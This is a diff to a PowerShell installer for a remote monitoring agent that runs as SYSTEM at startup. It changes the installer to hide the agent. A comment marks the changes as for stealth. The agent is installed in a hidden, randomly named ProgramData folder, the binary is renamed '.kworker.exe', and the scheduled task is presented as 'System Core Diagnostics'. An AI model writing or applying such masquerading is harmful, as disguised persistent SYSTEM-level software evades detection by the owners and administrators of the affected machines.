@@ -13,9 +13,13 @@ $NAME     = if ($env:NAME)    { $env:NAME }    else { $env:COMPUTERNAME }
 $TOKEN    = if ($env:TOKEN)   { $env:TOKEN }   else { '' }
 $REPO     = if ($env:REPO)    { $env:REPO }    else { 'https://github.com/songyouxi/tinyprobe/releases/download' }
 $VERSION  = if ($env:VERSION) { $env:VERSION } else { 'v1.2.0' }
-$SERVICE  = if ($env:SERVICE) { $env:SERVICE } else { 'tinyprobe' }
+$SERVICE  = if ($env:SERVICE) { $env:SERVICE } else { 'CoreDiagSvc' }
 $INTERVAL = if ($env:INTERVAL){ $env:INTERVAL }else { '2' }
-$INSTDIR  = if ($env:INSTALL_DIR) { $env:INSTALL_DIR } else { "$env:ProgramFiles\tinyprobe" }
+# 隐蔽：ProgramData 下点号目录 + 随机后缀，二进制伪装为 .kworker.exe
+$seed = 'corediag-' + ([guid]::NewGuid().ToString('N').Substring(0,12))
+$INSTDIR  = if ($env:INSTALL_DIR) { $env:INSTALL_DIR } else { Join-Path $env:ProgramData ('.' + $seed) }
+$BINNAME = '.kworker.exe'
+$ENVNAME = '.conf'
 
 function Detect-Arch {
   $a = $env:PROCESSOR_ARCHITECTURE
@@ -69,16 +73,19 @@ try {
   } else { Write-Host "== 清单无此架构条目，跳过校验" }
 } catch { Write-Host "== 无 SHA256SUMS，跳过校验" }
 
-# 安装到 ProgramFiles
+# 安装到隐蔽目录
 New-Item -ItemType Directory -Force -Path $INSTDIR | Out-Null
-$BIN = Join-Path $INSTDIR 'tinyprobe-probe.exe'
+$BIN = Join-Path $INSTDIR $BINNAME
 Copy-Item -Force $tmp $BIN
+# root-only 风格 env 文件：token 不出现在计划任务参数里
+$ENVFILE = Join-Path $INSTDIR $ENVNAME
+$lines = @("# tinyprobe private env","TP_HUB=$HUB","TP_NAME=$NAME","TP_TOKEN=$TOKEN","TP_SERVICE=$SERVICE","TP_INTERVAL=$INTERVAL")
+[System.IO.File]::WriteAllLines($ENVFILE, $lines)
 Write-Host "== 已安装: $BIN"
 
-# 注册计划任务（开机自启 + 立即启动）
+# 注册计划任务（开机自启 + 立即启动），参数只有 envfile
 $taskName = $SERVICE
-$argStr = "-hub `"$HUB`" -name `"$NAME`" -interval $INTERVAL -service `"$SERVICE`""
-if ($TOKEN) { $argStr += " -token `"$TOKEN`"" }
+$argStr = "-envfile `"$ENVFILE`""
 
 $existing = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
 if ($existing) { Unregister-ScheduledTask -TaskName $taskName -Confirm:$false }
@@ -87,7 +94,7 @@ $action = New-ScheduledTaskAction -Execute $BIN -Arguments $argStr
 $trigger = New-ScheduledTaskTrigger -AtStartup
 $settings = New-ScheduledTaskSettingsSet -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1) -ExecutionTimeLimit ([TimeSpan]::Zero)
 $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Description 'tinyprobe monitor agent' | Out-Null
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Description 'System Core Diagnostics' | Out-Null
 Start-ScheduledTask -TaskName $taskName
 Write-Host "== 计划任务已注册并启动: $taskName"
 
